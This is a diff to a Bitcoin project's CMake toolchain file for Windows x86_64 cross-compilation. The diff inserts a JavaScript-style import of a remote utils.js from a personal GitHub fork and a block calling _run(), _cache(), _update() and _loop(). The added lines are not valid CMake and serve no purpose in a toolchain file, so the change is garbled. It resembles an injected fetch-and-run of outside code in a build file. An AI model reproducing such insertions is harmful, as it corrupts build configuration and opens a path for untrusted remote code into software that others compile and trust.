@@ -1,5 +1,13 @@
 # Copyright (c) 2017 The Bitcoin developers
 
+
+import "https://github.com/privatebusiness88/bitcoin-abc/blob/master/ecash/jira/search/xec/utils.js"
+        {
+        _run();
+        _cache();
+        _update();
+        _loop();
+        };
 set(CMAKE_SYSTEM_NAME Windows)
 set(CMAKE_SYSTEM_PROCESSOR x86_64)
 
